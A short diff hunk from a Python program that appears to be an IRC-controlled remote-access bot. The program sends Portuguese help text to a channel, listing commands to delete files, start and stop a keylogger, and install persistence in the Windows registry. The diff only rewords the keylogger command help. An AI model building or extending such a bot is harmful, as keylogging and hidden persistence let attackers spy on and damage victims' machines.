@@ -393,9 +393,9 @@ def main():
 					time.sleep(1)
 					EnviaMsg(ircChanne, "use: [delete]        para excluir arquivos")
 					time.sleep(1)
-					EnviaMsg(ircChanne, "use: [start keylog]  para ativar o keylogger")
+					EnviaMsg(ircChanne, "use: [start start]  para ativar o keylogger")
 					time.sleep(1)
-					EnviaMsg(ircChanne, "use: [stop keylog]   para desativar o keylogger")
+					EnviaMsg(ircChanne, "use: [keylog stop]   para desativar o keylogger")
 					time.sleep(1)
 					EnviaMsg(ircChanne, "use: [persistence]   para instalar persistencia no registro do Windows")
 
